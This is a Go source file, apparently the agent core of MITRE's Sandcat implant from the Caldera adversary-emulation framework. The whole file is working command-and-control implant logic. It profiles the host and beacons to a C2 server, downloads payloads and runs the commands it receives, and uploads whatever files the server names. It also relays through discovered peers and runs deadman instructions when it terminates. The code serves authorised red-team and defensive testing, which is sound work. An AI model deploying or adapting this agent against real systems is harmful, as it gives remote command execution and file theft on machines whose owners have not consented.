package agent

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/grandcat/zeroconf"
	"github.com/mitre/gocat/contact"
	"github.com/mitre/gocat/encoders"
	"github.com/mitre/gocat/execute"
	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/payload"
	"github.com/mitre/gocat/privdetect"
	"github.com/mitre/gocat/proxy"
)

var beaconFailureThreshold = 3

type AgentInterface interface {
	Beacon() map[string]interface{}
	Initialize(server string, group string, c2Config map[string]string, enableLocalP2pReceivers bool) error
	RunInstruction(instruction map[string]interface{}, submitResults bool)
	Terminate()
	GetFullProfile() map[string]interface{}
	GetTrimmedProfile() map[string]interface{}
	SetCommunicationChannels(c2Config map[string]string) error
	SetPaw(paw string)
	Display()
	DownloadPayloadsForInstruction(instruction map[string]interface{}) ([]string, map[string][]byte)
	FetchPayloadBytes(payload string) []byte
	ActivateLocalP2pReceivers()
	TerminateLocalP2pReceivers()
	HandleBeaconFailure() error
	DiscoverPeers()
	AttemptSelectComChannel(requestedChannelConfig map[string]string, requestedChannel string) error
	GetCurrentContactName() string
	UploadFiles(instruction map[string]interface{})
	ProcessExecutorChange(executorChange map[string]interface{}) error
}

// Implements AgentInterface
type Agent struct {
	// Profile fields
	server                string
	tunnelConfig          *contact.TunnelConfig
	group                 string
	host                  string
	username              string
	architecture          string
	platform              string
	location              string
	pid                   int
	ppid                  int
	privilege             string
	exe_name              string
	paw                   string
	initialDelay          float64
	originLinkID          string
	hostIPAddrs           []string
	availableDataEncoders []string

	// Communication methods
	beaconContact       contact.Contact
	failedBeaconCounter int
	upstreamDestAddr    string // address of server/peer that agent uses to contact C2
	tunnel              contact.Tunnel
	usingTunnel         bool

	// peer-to-peer info
	enableLocalP2pReceivers   bool
	p2pReceiverWaitGroup      *sync.WaitGroup
	localP2pReceivers         map[string]proxy.P2pReceiver // maps P2P protocol to receiver running on this machine
	localP2pReceiverAddresses map[string][]string          // maps P2P protocol to receiver addresses listening on this machine
	availablePeerReceivers    map[string][]string          // maps P2P protocol to receiver addresses running on peer machines
	exhaustedPeerReceivers    map[string][]string          // maps P2P protocol to receiver addresses that the agent has tried using.
	usingPeerReceivers        bool                         // True if connecting to C2 via proxy peer

	// Deadman instructions to run before termination. Will be list of instruction mappings.
	deadmanInstructions []map[string]interface{}
}

// Set up agent variables.
func (a *Agent) Initialize(server string, tunnelConfig *contact.TunnelConfig, group string, c2Config map[string]string, enableLocalP2pReceivers bool, initialDelay int, paw string, originLinkID string) error {
	host, err := os.Hostname()
	if err != nil {
		return err
	}
	if userName, err := getUsername(); err == nil {
		a.username = userName
	} else {
		return err
	}
	a.server = server
	a.upstreamDestAddr = server
	a.tunnelConfig = tunnelConfig
	a.tunnel = nil
	a.group = group
	a.host = host
	a.architecture = runtime.GOARCH
	a.platform = runtime.GOOS
	a.location = getExecutablePath()
	a.pid = os.Getpid()
	a.ppid = os.Getppid()
	a.privilege = privdetect.Privlevel()
	a.exe_name = filepath.Base(os.Args[0])
	a.initialDelay = float64(initialDelay)
	a.failedBeaconCounter = 0
	a.originLinkID = originLinkID
	a.availableDataEncoders = encoders.GetAvailableDataEncoders()

	a.hostIPAddrs, err = proxy.GetLocalIPv4Addresses()
	if err != nil {
		return err
	}

	// Paw will get initialized after successful beacon if it's not specified via command line
	if paw != "" {
		a.paw = paw
	}

	// Load peer proxy receiver information
	a.exhaustedPeerReceivers = make(map[string][]string)
	a.usingPeerReceivers = false
	a.availablePeerReceivers, err = proxy.GetAvailablePeerReceivers()
	a.availablePeerReceivers[c2Config["c2Name"]] = append(a.availablePeerReceivers[c2Config["c2Name"]], server)
	if err != nil {
		return err
	}
	a.DiscoverPeers()

	if len(tunnelConfig.Protocol) > 0 {
		if err = a.StartTunnel(tunnelConfig); err != nil {
			return err
		}
	} else {
		output.VerbosePrint("[*] No tunnel protocol specified. Skipping tunnel setup.")
	}

	// Set up contacts
	if err = a.SetCommunicationChannels(c2Config); err != nil {
		return err
	}

	// Set up P2P receivers.
	a.enableLocalP2pReceivers = enableLocalP2pReceivers
	if a.enableLocalP2pReceivers {
		a.localP2pReceivers = make(map[string]proxy.P2pReceiver)
		a.localP2pReceiverAddresses = make(map[string][]string)
		a.p2pReceiverWaitGroup = &sync.WaitGroup{}
		a.ActivateLocalP2pReceivers()
	}
	return nil
}

// Returns full profile for agent.
func (a *Agent) GetFullProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw":                a.paw,
		"server":             a.server,
		"group":              a.group,
		"host":               a.host,
		"contact":            a.GetCurrentContactName(),
		"username":           a.username,
		"architecture":       a.architecture,
		"platform":           a.platform,
		"location":           a.location,
		"pid":                a.pid,
		"ppid":               a.ppid,
		"executors":          execute.AvailableExecutors(),
		"privilege":          a.privilege,
		"exe_name":           a.exe_name,
		"proxy_receivers":    a.localP2pReceiverAddresses,
		"origin_link_id":     a.originLinkID,
		"deadman_enabled":    true,
		"available_contacts": contact.GetAvailableCommChannels(),
		"host_ip_addrs":      a.hostIPAddrs,
		"upstream_dest":      a.upstreamDestAddr,
	}
}

// Return minimal subset of agent profile.
func (a *Agent) GetTrimmedProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw":           a.paw,
		"server":        a.server,
		"platform":      a.platform,
		"host":          a.host,
		"contact":       a.GetCurrentContactName(),
		"upstream_dest": a.upstreamDestAddr,
	}
}

// Pings C2 for instructions and returns them.
func (a *Agent) Beacon() map[string]interface{} {
	var beacon map[string]interface{}
	profile := a.GetFullProfile()
	response := a.beaconContact.GetBeaconBytes(profile)
	if response != nil {
		beacon = a.processBeacon(response)
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return beacon
}

// Converts the given data into a beacon with instructions.
func (a *Agent) processBeacon(data []byte) map[string]interface{} {
	var beacon map[string]interface{}
	if err := json.Unmarshal(data, &beacon); err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon received: %s", err.Error()))
	} else {
		var commands interface{}
		if err := json.Unmarshal([]byte(beacon["instructions"].(string)), &commands); err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon instructions received: %s", err.Error()))
		} else {
			output.VerbosePrint(fmt.Sprintf("[+] Beacon (%s): ALIVE", a.GetCurrentContactName()))
			beacon["sleep"] = int(beacon["sleep"].(float64))
			beacon["watchdog"] = int(beacon["watchdog"].(float64))
			beacon["instructions"] = commands
		}
	}
	return beacon
}

// If too many consecutive failures occur for the current communication method, switch to a new proxy method.
// Return an error if switch fails.
func (a *Agent) HandleBeaconFailure() error {
	a.failedBeaconCounter += 1
	if a.failedBeaconCounter >= beaconFailureThreshold {
		// Reset counter and try switching proxy methods
		a.failedBeaconCounter = 0
		output.VerbosePrint("[!] Reached beacon failure threshold. Attempting to switch to new peer proxy method.")
		a.usingTunnel = false
		return a.findAvailablePeerProxyClient()
	}
	return nil
}

func (a *Agent) Terminate() {
	// Add any cleanup/termination functionality here.
	output.VerbosePrint("[*] Beginning agent termination.")
	if a.enableLocalP2pReceivers {
		a.TerminateLocalP2pReceivers()
	}

	// Run deadman instructions prior to termination
	a.ExecuteDeadmanInstructions()
	output.VerbosePrint("[*] Terminating Sandcat Agent... goodbye.")
}

// Runs a single instruction and send results if specified.
// Will handle payload downloads according to executor.
func (a *Agent) RunInstruction(instruction map[string]interface{}, submitResults bool) {
	result := a.runInstructionCommand(instruction)
	if submitResults {
		output.VerbosePrint(fmt.Sprintf("[*] Submitting results for link %s via C2 channel %s", result["id"].(string), a.GetCurrentContactName()))
		a.beaconContact.SendExecutionResults(a.GetTrimmedProfile(), result)
	}
	a.UploadFiles(instruction)
}

func (a *Agent) runInstructionCommand(instruction map[string]interface{}) map[string]interface{} {
	onDiskPayloads, inMemoryPayloads := a.DownloadPayloadsForInstruction(instruction)
	info := execute.InstructionInfo{
		Profile:          a.GetTrimmedProfile(),
		Instruction:      instruction,
		OnDiskPayloads:   onDiskPayloads,
		InMemoryPayloads: inMemoryPayloads,
	}

	// Execute command
	var commandResults execute.CommandResults
	commandResults = execute.RunCommand(info)

	// Clean up payloads
	if del, ok := instruction["delete_payload"].(bool); ok && del {
		a.removePayloadsOnDisk(onDiskPayloads)
	}

	// Handle results
	result := make(map[string]interface{})
	result["id"] = instruction["id"]
	result["output"] = commandResults.StandardOutput
	result["stderr"] = commandResults.StandardError
	result["exit_code"] = commandResults.ExitCode
	result["status"] = commandResults.StatusCode
	result["pid"] = commandResults.Pid
	result["agent_reported_time"] = getFormattedTimestamp(commandResults.ExecutionTimestamp, "2006-01-02T15:04:05Z")
	return result
}

func (a *Agent) UploadFiles(instruction map[string]interface{}) {
	if instruction["uploads"] != nil && len(instruction["uploads"].([]interface{})) > 0 {
		uploads, ok := instruction["uploads"].([]interface{})
		if !ok {
			output.VerbosePrint(fmt.Sprintf(
				"[!] Error: expected []interface{}, but received %T for upload info",
				instruction["uploads"],
			))
			return
		}

		for _, path := range uploads {
			filePath := path.(string)
			if err := a.uploadSingleFile(filePath); err != nil {
				output.VerbosePrint(fmt.Sprintf("[!] Error uploading file %s: %v", filePath, err.Error()))
			}
		}
	}
}

func (a *Agent) uploadSingleFile(path string) error {
	output.VerbosePrint(fmt.Sprintf("Uploading file: %s", path))

	// Get file bytes
	fetchedBytes, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	return a.beaconContact.UploadFileBytes(a.GetFullProfile(), filepath.Base(path), fetchedBytes)
}

func (a *Agent) removePayloadsOnDisk(payloads []string) {
	for _, payloadPath := range payloads {
		err := os.Remove(payloadPath)
		if err != nil {
			output.VerbosePrint("[!] Failed to delete payload: " + payloadPath)
		}
	}
}

// Sets the communication channels for the agent according to the specified channel configuration map.
// Will resort to peer-to-peer if agent doesn't support the requested channel or if the C2's requirements
// are not met. If the original requested channel cannot be used and there are no compatible peer proxy receivers,
// then an error will be returned.
// This method does not test connectivity to the requested server or to proxy receivers.
func (a *Agent) SetCommunicationChannels(requestedChannelConfig map[string]string) error {
	if len(contact.CommunicationChannels) > 0 {
		if requestedChannel, ok := requestedChannelConfig["c2Name"]; ok {
			if err := a.AttemptSelectComChannel(requestedChannelConfig, requestedChannel); err == nil {
				return nil
			} else {
				output.VerbosePrint(fmt.Sprintf("[!] Error setting comm channel: %v", err.Error()))
			}
		}
		// Original requested channel not found. See if we can use any available peer-to-peer-proxy receivers.
		output.VerbosePrint("[!] Requested communication channel not valid or available. Resorting to peer-to-peer.")
		return a.findAvailablePeerProxyClient()
	}
	return errors.New("No possible C2 communication channels found.")
}

// Attempts to set a given communication channel for the agent.
func (a *Agent) AttemptSelectComChannel(requestedChannelConfig map[string]string, requestedChannel string) error {
	coms, ok := contact.CommunicationChannels[requestedChannel]
	output.VerbosePrint(fmt.Sprintf("[*] Attempting to set channel %s", requestedChannel))
	if !ok {
		return errors.New(fmt.Sprintf("%s channel not available", requestedChannel))
	}
	coms.SetUpstreamDestAddr(a.upstreamDestAddr)
	valid, config := coms.C2RequirementsMet(a.GetFullProfile(), requestedChannelConfig)
	if valid {
		if config != nil {
			a.modifyAgentConfiguration(config)
		}
		a.updateUpstreamComs(coms)
		output.VerbosePrint(fmt.Sprintf("[*] Set communication channel to %s", requestedChannel))
		return nil
	}
	return errors.New(fmt.Sprintf("%s channel available, but requirements not met.", requestedChannel))
}

// Outputs information about the agent.
func (a *Agent) Display() {
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", int(a.initialDelay)))
	output.VerbosePrint(fmt.Sprintf("server=%s", a.server))
	output.VerbosePrint(fmt.Sprintf("upstream dest addr=%s", a.upstreamDestAddr))
	output.VerbosePrint(fmt.Sprintf("group=%s", a.group))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", a.privilege))
	output.VerbosePrint(fmt.Sprintf("allow local p2p receivers=%v", a.enableLocalP2pReceivers))
	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", a.GetCurrentContactName()))
	if a.enableLocalP2pReceivers {
		a.displayLocalReceiverInformation()
	}
	if a.usingTunnel {
		output.VerbosePrint(fmt.Sprintf("Local tunnel endpoint=%s", a.upstreamDestAddr))
	}
	output.VerbosePrint(fmt.Sprintf("available data encoders=%s", strings.Join(a.availableDataEncoders, ", ")))
}

func (a *Agent) displayLocalReceiverInformation() {
	for receiverName, _ := range proxy.P2pReceiverChannels {
		if _, ok := a.localP2pReceivers[receiverName]; ok {
			output.VerbosePrint(fmt.Sprintf("P2p receiver %s=activated", receiverName))
		} else {
			output.VerbosePrint(fmt.Sprintf("P2p receiver %s=NOT activated", receiverName))
		}
	}
	for protocol, addressList := range a.localP2pReceiverAddresses {
		for _, address := range addressList {
			output.VerbosePrint(fmt.Sprintf("%s local proxy receiver available at %s", protocol, address))
		}
	}
}

// Will download each individual payload listed for the given executor. The executor will determine
// which payloads get written to disk, and which ones get saved in memory.
// Returns list of payload names for the payloads written to disk, and a map of payload names linked to their
// respective bytes for payloads saved in memory.
func (a *Agent) DownloadPayloadsForInstruction(instruction map[string]interface{}) ([]string, map[string][]byte) {
	payloads := instruction["payloads"].([]interface{})
	executorName := instruction["executor"].(string)
	executor, ok := execute.Executors[executorName]
	var onDiskPayloadNames []string
	inMemoryPayloads := make(map[string][]byte)
	if !ok {
		output.VerbosePrint(fmt.Sprintf("[!] No executor found for executor name %s. Not downloading payloads.", executorName))
		return onDiskPayloadNames, inMemoryPayloads
	}
	availablePayloads := reflect.ValueOf(payloads)

	for i := 0; i < availablePayloads.Len(); i++ {
		payloadName := availablePayloads.Index(i).Elem().String()
		payloadBytes, filename := a.FetchPayloadBytes(payloadName)
		if len(payloadBytes) == 0 || len(filename) == 0 {
			output.VerbosePrint(fmt.Sprintf("Failed to fetch payload bytes for payload %s", payloadName))
			continue
		}

		// Ask executor what to do with the payload bytes (keep in memory or save to disk)
		if executor.DownloadPayloadToMemory(payloadName) {
			output.VerbosePrint(fmt.Sprintf("[*] Storing payload %s in memory", payloadName))
			inMemoryPayloads[payloadName] = payloadBytes
		} else {
			if location, err := payload.WriteToDisk(payloadName, payloadBytes); err != nil {
				output.VerbosePrint(fmt.Sprintf("[-] %s", err.Error()))
			} else {
				onDiskPayloadNames = append(onDiskPayloadNames, location)
			}
		}
	}
	return onDiskPayloadNames, inMemoryPayloads
}

// Will request payload bytes from the C2 for the specified payload and return them.
func (a *Agent) FetchPayloadBytes(payload string) ([]byte, string) {
	output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes via C2 channel %s: %s", a.GetCurrentContactName(), payload))
	return a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
}

func (a *Agent) Sleep(sleepTime float64) {
	time.Sleep(time.Duration(sleepTime) * time.Second)
}

func (a *Agent) GetPaw() string {
	return a.paw
}

func (a *Agent) SetPaw(paw string) {
	if len(paw) > 0 {
		a.paw = paw
		if a.enableLocalP2pReceivers {
			for _, receiver := range a.localP2pReceivers {
				receiver.UpdateAgentPaw(paw)
			}
		}
	}
}

func (a *Agent) GetBeaconContact() contact.Contact {
	return a.beaconContact
}

func (a *Agent) StoreDeadmanInstruction(instruction map[string]interface{}) {
	a.deadmanInstructions = append(a.deadmanInstructions, instruction)
}

func (a *Agent) ExecuteDeadmanInstructions() {
	for _, instruction := range a.deadmanInstructions {
		output.VerbosePrint(fmt.Sprintf("[*] Running deadman instruction %s", instruction["id"]))
		a.RunInstruction(instruction, false)
	}
}

func (a *Agent) modifyAgentConfiguration(config map[string]string) {
	if val, ok := config["paw"]; ok {
		a.SetPaw(val)
	}
	if val, ok := config["upstreamDest"]; ok {
		a.updateUpstreamDestAddr(val)
	}
}

func (a *Agent) updateUpstreamDestAddr(newDestAddr string) {
	a.upstreamDestAddr = newDestAddr
	if a.beaconContact != nil {
		a.beaconContact.SetUpstreamDestAddr(newDestAddr)
	}
}

func (a *Agent) updateUpstreamComs(newComs contact.Contact) {
	a.beaconContact = newComs
}

func (a *Agent) evaluateNewPeers(results <-chan *zeroconf.ServiceEntry) {
	for entry := range results {
		for _, ip := range entry.AddrIPv4 {
			a.mergeNewPeers(entry.Text[0], fmt.Sprintf("%s:%d", ip, entry.Port))
		}
	}
}

func (a *Agent) mergeNewPeers(proxyChannel string, ipPort string) {
	peer := fmt.Sprintf("%s://%s", strings.ToLower(proxyChannel), ipPort)
	allPeers := append(a.availablePeerReceivers[proxyChannel], a.exhaustedPeerReceivers[proxyChannel]...)
	for _, existingPeer := range allPeers {
		if peer == existingPeer {
			return
		}
	}
	for protocol, addressList := range a.localP2pReceiverAddresses {
		if proxyChannel == protocol {
			for _, address := range addressList {
				if peer == address {
					return
				}
			}
		}
	}
	a.availablePeerReceivers[proxyChannel] = append(a.availablePeerReceivers[proxyChannel], peer)
	output.VerbosePrint(fmt.Sprintf("[*] new peer added: %s", peer))
}

func (a *Agent) DiscoverPeers() {
	// Recover on any panic on the external module call and not take down the whole agent.
	defer func() {
		if err := recover(); err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Panic occurred when calling zeroconf: %v", err))
		}
	}()

	// Discover all services on the network (e.g. _workstation._tcp)
	resolver, err := zeroconf.NewResolver(nil)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to initialize zeroconf resolver: %s", err.Error()))
	}

	entries := make(chan *zeroconf.ServiceEntry)
	go a.evaluateNewPeers(entries)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second*1)
	defer cancel()
	err = resolver.Browse(ctx, "_service._comms", "local.", entries)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to browse for peers: %s", err.Error()))
	}

	<-ctx.Done()
}

func (a *Agent) GetCurrentContactName() string {
	if currContact := a.GetBeaconContact(); currContact != nil {
		return currContact.GetName()
	}
	return ""
}

func (a *Agent) ProcessExecutorChange(executorUpdateMap interface{}) error {
	executorUpdate, ok := executorUpdateMap.(map[string]interface{})
	if !ok {
		return errors.New("Malformed executor update mapping.")
	}
	executorName := executorUpdate["executor"].(string)
	action := executorUpdate["action"].(string)
	value := executorUpdate["value"]
	if len(executorName) > 0 && len(action) > 0 {
		executor, ok := execute.Executors[executorName]
		if !ok {
			return errors.New(fmt.Sprintf("[Executor not found for %s", executorName))
		}
		switch action {
		case "remove":
			output.VerbosePrint(fmt.Sprintf("[*] Removing executor %s", executorName))
			execute.RemoveExecutor(executorName)
			return nil
		case "update_path":
			newPath, ok := value.(string)
			if !ok {
				return errors.New(fmt.Sprintf(
					"[!] Error: expected string for new executor path, but received %T",
					value,
				))
			}
			output.VerbosePrint(fmt.Sprintf("[*] Updating executor %s with new path %s", executorName, newPath))
			executor.UpdateBinary(newPath)
			return nil
		default:
			return errors.New(fmt.Sprintf("[!] Error: executor update action %s not supported", action))
		}
	} else {
		return errors.New("Missing executor name or action for executor update.")
	}
}
